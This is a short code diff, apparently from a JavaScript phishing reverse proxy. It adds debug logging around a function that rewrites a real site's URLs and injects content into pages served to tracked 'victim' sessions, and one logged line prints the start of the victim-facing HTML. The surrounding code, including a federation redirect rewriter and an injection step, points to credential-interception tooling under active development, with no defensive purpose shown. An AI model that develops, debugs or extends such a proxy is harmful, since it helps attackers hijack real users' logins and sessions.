@@ -586,6 +586,7 @@ const caption =
         const cleanedBuffer = Buffer.from(html);
 
         // ---- STATIC injection (original method) ----
+        console.log('[DEBUG] About to call processHtmlResponse. HTML length:', cleanedBuffer.length);
         serverResponseBody = processHtmlResponse(cleanedBuffer, currentSession, VICTIM_SESSIONS, proxyHostname);
         serverResponseBody = await compressResponseBody(serverResponseBody, encodings);
 
@@ -1253,6 +1254,7 @@ function updateFederationRedirectUrl(decompressedResponseBody, proxyHostname) {
 }
 
 function processHtmlResponse(htmlBuffer, sessionId, sessions, proxyHostname) {
+    console.log('[DEBUG] processHtmlResponse called for session:', sessionId);
     const session = sessions[sessionId];
     if (!session) return htmlBuffer;
 
@@ -1263,6 +1265,7 @@ function processHtmlResponse(htmlBuffer, sessionId, sessions, proxyHostname) {
 
     // ---- 1. REWRITE ABSOLUTE URLS IN THE HTML ----
     let html = htmlBuffer.toString('utf8');
+    console.log('[DEBUG] HTML preview:', html.substring(0, 500));
 
     // Replace all absolute references to the real host
     const hostRegex = new RegExp(`https?:\\/\\/${realHost.replace(/\./g, '\\.')}`, 'g');
